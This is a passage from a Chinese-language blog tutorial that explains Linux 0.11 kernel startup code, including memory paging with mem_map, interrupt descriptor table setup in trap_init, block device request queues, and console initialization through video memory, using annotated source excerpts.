，表示无法再被分配。</p><p>2M 以上就是<strong>主内存区域</strong>，初始化时都是 0 。</p><hr><p>简单讲一下程序是怎么申请内存，以及是怎么使用 mem_map 这个结构的：</p><p>在 <strong>memory.c</strong> 文件中有个函数 **get_free_page()**，用于在主内存区中申请一页空闲内存页，并返回物理内存页的起始地址。</p><p>比如我们在 fork 子进程的时候，会调用 <strong>copy_process</strong> 函数来复制进程的结构信息，其中有一个步骤就是要<strong>申请一页内存</strong>，用于存放进程结构信息 task_struct。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    p = (struct task_struct *) get_free_page();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看 get_free_page 的具体实现，是内联汇编代码，看不懂不要紧，注意它里面就有 <strong>mem_map</strong> 结构的使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_free_page</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __res <span class="title">asm</span><span class="params">(<span class="string">&quot;ax&quot;</span>)</span></span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;std ; repne ; scasb\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;jne 1f\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movb $1,1(%%edi)\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;sall $12,%%ecx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;addl %2,%%ecx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movl %%ecx,%%edx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movl $1024,%%ecx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;leal 4092(%%edx),%%edi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;rep ; stosl\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movl %%edx,%%eax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;1:&quot;</span></span><br><span class="line">        :<span class="string">&quot;=a&quot;</span> (__res)</span><br><span class="line">        :<span class="string">&quot;0&quot;</span> (<span class="number">0</span>),<span class="string">&quot;i&quot;</span> (LOW_MEM),<span class="string">&quot;c&quot;</span> (PAGING_PAGES),</span><br><span class="line">        <span class="string">&quot;D&quot;</span> (mem_map + PAGING_PAGES<span class="number">-1</span>) <span class="comment">//mem_map 使用</span></span><br><span class="line">        :<span class="string">&quot;di&quot;</span>,<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;dx&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> __res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是选择 mem_map 中首个空闲页面，并标记为已使用。</p><hr><p><strong>总结一下 mem_init() 干的事：用 men_map 结构记录内存中哪些被占用哪些没被占用来管理主内存区</strong></p><h3 id="trap-init"><a href="#trap-init" class="headerlink" title="trap_init()"></a>trap_init()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    trap_init();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    set_trap_gate(<span class="number">0</span>,&amp;divide_error);<span class="comment">//0为中断号，&amp;divide_error为中断程序地址</span></span><br><span class="line">    set_trap_gate(<span class="number">1</span>,&amp;debug);</span><br><span class="line">    set_trap_gate(<span class="number">2</span>,&amp;nmi);</span><br><span class="line">    set_system_gate(<span class="number">3</span>,&amp;int3);   <span class="comment">/* int3-5 can be called from all */</span></span><br><span class="line">    set_system_gate(<span class="number">4</span>,&amp;overflow);</span><br><span class="line">    set_system_gate(<span class="number">5</span>,&amp;bounds);</span><br><span class="line">    set_trap_gate(<span class="number">6</span>,&amp;invalid_op);</span><br><span class="line">    set_trap_gate(<span class="number">7</span>,&amp;device_not_available);</span><br><span class="line">    set_trap_gate(<span class="number">8</span>,&amp;double_fault);</span><br><span class="line">    set_trap_gate(<span class="number">9</span>,&amp;coprocessor_segment_overrun);</span><br><span class="line">    set_trap_gate(<span class="number">10</span>,&amp;invalid_TSS);</span><br><span class="line">    set_trap_gate(<span class="number">11</span>,&amp;segment_not_present);</span><br><span class="line">    set_trap_gate(<span class="number">12</span>,&amp;stack_segment);</span><br><span class="line">    set_trap_gate(<span class="number">13</span>,&amp;general_protection);</span><br><span class="line">    set_trap_gate(<span class="number">14</span>,&amp;page_fault);</span><br><span class="line">    set_trap_gate(<span class="number">15</span>,&amp;reserved);</span><br><span class="line">    set_trap_gate(<span class="number">16</span>,&amp;coprocessor_error);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">17</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">        set_trap_gate(i,&amp;reserved);</span><br><span class="line">    set_trap_gate(<span class="number">45</span>,&amp;irq13);</span><br><span class="line">    set_trap_gate(<span class="number">39</span>,&amp;parallel_interrupt);</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>这一堆 set_xxx_gate 是啥意思呢，得先去看看它们的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _set_gate(gate_addr,type,dpl,addr) \</span></span><br><span class="line">__asm__ (<span class="string">&quot;movw %%dx,%%ax\n\t&quot;</span> \</span><br><span class="line">    <span class="string">&quot;movw %0,%%dx\n\t&quot;</span> \</span><br><span class="line">    <span class="string">&quot;movl %%eax,%1\n\t&quot;</span> \</span><br><span class="line">    <span class="string">&quot;movl %%edx,%2&quot;</span> \</span><br><span class="line">    : \</span><br><span class="line">    : <span class="string">&quot;i&quot;</span> ((<span class="keyword">short</span>) (<span class="number">0x8000</span>+(dpl&lt;&lt;<span class="number">13</span>)+(type&lt;&lt;<span class="number">8</span>))), \</span><br><span class="line">    <span class="string">&quot;o&quot;</span> (*((<span class="keyword">char</span> *) (gate_addr))), \</span><br><span class="line">    <span class="string">&quot;o&quot;</span> (*(<span class="number">4</span>+(<span class="keyword">char</span> *) (gate_addr))), \</span><br><span class="line">    <span class="string">&quot;d&quot;</span> ((<span class="keyword">char</span> *) (addr)),<span class="string">&quot;a&quot;</span> (<span class="number">0x00080000</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_trap_gate(n,addr) \</span></span><br><span class="line">    _set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">0</span>,addr)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_system_gate(n,addr) \</span></span><br><span class="line">    _set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">3</span>,addr)</span><br></pre></td></tr></table></figure><p>可以看到 <strong>set_trap_gate</strong> 和 <strong>set_system_gate</strong> 都指向了另一个宏定义 <strong>_set_gate</strong>，所以现在具体看一看 _set_gate，笑死根本看不懂，只需要知道结果就行，最终效果是<strong>在中断描述符表中插入了一个中断描述符</strong>。</p><p>所以上面那一段代码就是<strong>往中断描述符表里插入一个又一个中断描述符</strong>，第一个参数是中断号，第二个参数是中断处理程序地址。</p><p>set_trap_gate 和 set_system_gate 区别又是什么呢？这里只简单讲一下，区别只在于中断描述符的特权级不同，0 表示内核态，3 表示用户态。</p><p>再然后就是用 for 循环的一个批量赋值操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">17</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">        set_trap_gate(i,&amp;reserved);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>17 到 47 号都设置为了 reserved 函数，这只是暂时给它赋了这个值，之后各个硬件初始化会重新设置这些中断。</p><p>所以现在内存图长这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648002877578011/2cd0f8e82a5a4c2293c186453ed3693300c92a65.png" alt="640 (1)"></p><p><strong>总结一下 trap_init() 干的事：完善了 idt 表，其中 <code>0~16</code> 中断号被设置为了相对应的中断处理程序，<code>17~47</code>中断号被设置为了临时函数 reserved 。</strong></p><h3 id="blk-dev-init"><a href="#blk-dev-init" class="headerlink" title="blk_dev_init()"></a>blk_dev_init()</h3><p>块设备初始化，块设备是 I/O 设备中的一类，是将信息存储在固定大小的块中，每个块都有自己的地址，还可以在设备的任意位置读取一定长度的数据，例如硬盘,U盘，SD卡等。</p><p>讲人话就是读取这些设备之前做的准备工作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    blk_dev_init();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_dev_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        request[i].dev = <span class="number">-1</span>;</span><br><span class="line">        request[i].next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给 request 数组的前 32 个元素的两个变量 dev 和 next 初始化。</p><p>看一下 request 结构体，这个结构体可以完整描述一个读盘操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, this is an expanded form so that we can use the same</span></span><br><span class="line"><span class="comment"> * request for paging requests when that is implemented. In</span></span><br><span class="line"><span class="comment"> * paging, &#x27;bh&#x27; is NULL, and &#x27;waiting&#x27; is used to wait for</span></span><br><span class="line"><span class="comment"> * read/write completion.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> dev;        <span class="comment">/* -1 if no request */</span></span><br><span class="line">    <span class="keyword">int</span> cmd;        <span class="comment">/* READ or WRITE */</span></span><br><span class="line">    <span class="keyword">int</span> errors;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sector;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_sectors;</span><br><span class="line">    <span class="keyword">char</span> * buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">waiting</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>dev：设备号，-1 表示空闲</li><li>cmd：命令，READ &amp; WRITE，表示本次操作是读或者是写</li><li>errors：操作时产生的错误次数</li><li>sector：起始扇区</li><li>nr_sectors：扇区数</li><li>buffer：数据缓冲区，也就是读盘后数据放在内存中的位置</li><li>waiting：task_struct 结构，表示发起请求的进程</li><li>bh：缓冲区头指针</li><li>next：指向下一个请求项的指针</li></ul><p>request 数组就相当于把 32 个 request 结构体集成，然后用 next 指针串成链表。</p><hr><p>简单说一下系统是怎么用到 request[32] 这个结构的：</p><p>读操作的系统调用函数是 sys_read，简化一下就是如下样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span> =</span> current-&gt;filp[fd];<span class="comment">//</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span> =</span> file-&gt;f_inode;</span><br><span class="line">    <span class="comment">// 校验 buf 区域的内存限制</span></span><br><span class="line">    verify_area(buf,count);</span><br><span class="line">    <span class="comment">// 仅关注目录文件或普通文件</span></span><br><span class="line">    <span class="keyword">return</span> file_read(inode,file,buf,count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二行的 fd 是文件描述符，通过它可以找到一个文件的 inode，进而找到这个文件在硬盘中的位置。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648173848142684/0775d3f21c55c64b4d5805a9b09b7a086cdc204a.png" alt="640"></p><p><code>file_read</code> 函数第一、二个参数也可以从图中对应，第三个参数 buf 指要复制到的内存的地址，第四个参数 count 指要赋值的字节数。</p><p>继续看看 file_read 函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_read</span><span class="params">(struct m_inode * inode, struct file * filp, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left,chars,nr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line">    left = count;</span><br><span class="line">    <span class="keyword">while</span> (left) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nr = bmap(inode,(filp-&gt;f_pos)/BLOCK_SIZE)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(bh=bread(inode-&gt;i_dev,nr)))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            bh = <span class="literal">NULL</span>;</span><br><span class="line">        nr = filp-&gt;f_pos % BLOCK_SIZE;</span><br><span class="line">        chars = MIN( BLOCK_SIZE-nr , left );</span><br><span class="line">        filp-&gt;f_pos += chars;</span><br><span class="line">        left -= chars;</span><br><span class="line">        <span class="keyword">if</span> (bh) &#123;</span><br><span class="line">            <span class="keyword">char</span> * p = nr + bh-&gt;b_data;</span><br><span class="line">            <span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)</span><br><span class="line">                put_fs_byte(*(p++),buf++);</span><br><span class="line">            brelse(bh);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)</span><br><span class="line">                put_fs_byte(<span class="number">0</span>,buf++);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    inode-&gt;i_atime = CURRENT_TIME;</span><br><span class="line">    <span class="keyword">return</span> (count-left)?(count-left):-ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体看，就是一个 while 循环，每次读入一个块的数据，直到入参所要求的大小全部读完。</p><p>再看到 bread 那一行，这个函数就是去读某一个设备的某一个数据块号的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct buffer_head * <span class="title">bread</span><span class="params">(<span class="keyword">int</span> dev,<span class="keyword">int</span> block)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span> =</span> getblk(dev,block);</span><br><span class="line">    <span class="keyword">if</span> (bh-&gt;b_uptodate)</span><br><span class="line">        <span class="keyword">return</span> bh;</span><br><span class="line">    ll_rw_block(READ,bh);</span><br><span class="line">    wait_on_buffer(bh);</span><br><span class="line">    <span class="keyword">if</span> (bh-&gt;b_uptodate)</span><br><span class="line">        <span class="keyword">return</span> bh;</span><br><span class="line">    brelse(bh);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 getblk 先申请了一个内存中的缓冲块，然后 ll_rw_block 负责把数据读入这个缓冲块。</p><p>跟进</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ll_rw_block</span><span class="params">(<span class="keyword">int</span> rw, struct buffer_head * bh)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    make_request(major,rw,bh);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">make_request</span><span class="params">(<span class="keyword">int</span> major,<span class="keyword">int</span> rw, struct buffer_head * bh)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (rw == READ)</span><br><span class="line">        req = request+NR_REQUEST;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        req = request+((NR_REQUEST*<span class="number">2</span>)/<span class="number">3</span>);</span><br><span class="line"><span class="comment">/* find an empty request */</span></span><br><span class="line">    <span class="keyword">while</span> (--req &gt;= request)</span><br><span class="line">        <span class="keyword">if</span> (req-&gt;dev&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* fill up the request-info, and add it to the queue */</span></span><br><span class="line">    req-&gt;dev = bh-&gt;b_dev;</span><br><span class="line">    req-&gt;cmd = rw;</span><br><span class="line">    req-&gt;errors=<span class="number">0</span>;</span><br><span class="line">    req-&gt;sector = bh-&gt;b_blocknr&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    req-&gt;nr_sectors = <span class="number">2</span>;</span><br><span class="line">    req-&gt;buffer = bh-&gt;b_data;</span><br><span class="line">    req-&gt;waiting = <span class="literal">NULL</span>;</span><br><span class="line">    req-&gt;bh = bh;</span><br><span class="line">    req-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    add_request(major+blk_dev,req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到用到了 request 结构。</p><p>具体说来，就是该函数会往刚刚的设备的请求项链表 request[32] 中添加一个请求项，只要 request[32] 中有未处理的请求项存在，都会陆续地被处理，直到设备的请求项链表是空为止。</p><p>所有 request[32] 是<strong>块设备驱动程序</strong>和<strong>内存缓冲区</strong>的桥梁，通过它可以完整地表示一个块设备读写操作要做的事。</p><hr><h3 id="tty-init"><a href="#tty-init" class="headerlink" title="tty_init()"></a>tty_init()</h3><p>执行完成后，我们会具备键盘输入到显示器输出字符这个最常用的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    tty_init();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tty_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    rs_init();</span><br><span class="line">    con_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看第一个函数 <code>rs_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rs_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_intr_gate(<span class="number">0x24</span>,rs1_interrupt);</span><br><span class="line">    set_intr_gate(<span class="number">0x23</span>,rs2_interrupt);</span><br><span class="line">    init(tty_table[<span class="number">1</span>].read_q.data);</span><br><span class="line">    init(tty_table[<span class="number">2</span>].read_q.data);</span><br><span class="line">    outb(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xE7</span>,<span class="number">0x21</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>串口中断的开启，以及设置对应的中断处理程序，串口已经很少用到了，所以直接忽略。</p><p>再看第二个函数 <code>con_init()</code></p><p>先将大致框架写出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ORIG_VIDEO_MODE == <span class="number">7</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> ((ORIG_VIDEO_EGA_BX &amp; <span class="number">0xff</span>) != <span class="number">0x10</span>) &#123;...&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;...&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> ((ORIG_VIDEO_EGA_BX &amp; <span class="number">0xff</span>) != <span class="number">0x10</span>) &#123;...&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;...&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一大堆 if else，这是为了应对不同的显示模式，来分配不同的变量值。那么我们就只需要看一个，便能推出其他所有。</p><p>显示模式是什么呢？或者追溯本源，一个字符是怎么显示在屏幕上的呢？操作系统和 CPU 等硬件设备为了这件事都干了啥呢？</p><p>之前有说过，设备会将自己要处理的数据映射到内存上。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648372387597933/37986f0157a42823961593902741ce195889364d.png" alt="640 (1)"></p><p>从图中可以看出，内存中有一部分区域是，是和显存映射的。说人话就是，往这些内存区域写数据，相当于写在了显存中，往显存中写数据，就相当于在屏幕上写数据。</p><p>举个例子</p><p>当我们写这样一行汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [0xB8000],&#39;h&#39;</span><br></pre></td></tr></table></figure><p>就会在屏幕中输出<code>h</code>这个字符。</p><p><code>0xB8000</code>指的是什么呢，这里只浅说一下，这片内存是每两个字节表示一个显示在屏幕上的字符，<strong>第一个是字符的编码，第二个是字符的颜色</strong>。(不理解也么事)</p><p>所以现在代码就可以简化成这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIG_X          (*(unsigned char *)0x90000)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIG_Y          (*(unsigned char *)0x90001)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> a;</span><br><span class="line">    <span class="comment">// 第一部分 获取显示模式相关信息</span></span><br><span class="line">    video_num_columns = (((*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)<span class="number">0x90006</span>) &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    video_size_row = video_num_columns * <span class="number">2</span>;</span><br><span class="line">    video_num_lines = <span class="number">25</span>;</span><br><span class="line">    video_page = (*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)<span class="number">0x90004</span>);</span><br><span class="line">    video_erase_char = <span class="number">0x0720</span>;</span><br><span class="line">    <span class="comment">// 第二部分 显存映射的内存区域 </span></span><br><span class="line">    video_mem_start = <span class="number">0xb8000</span>;</span><br><span class="line">    video_port_reg  = <span 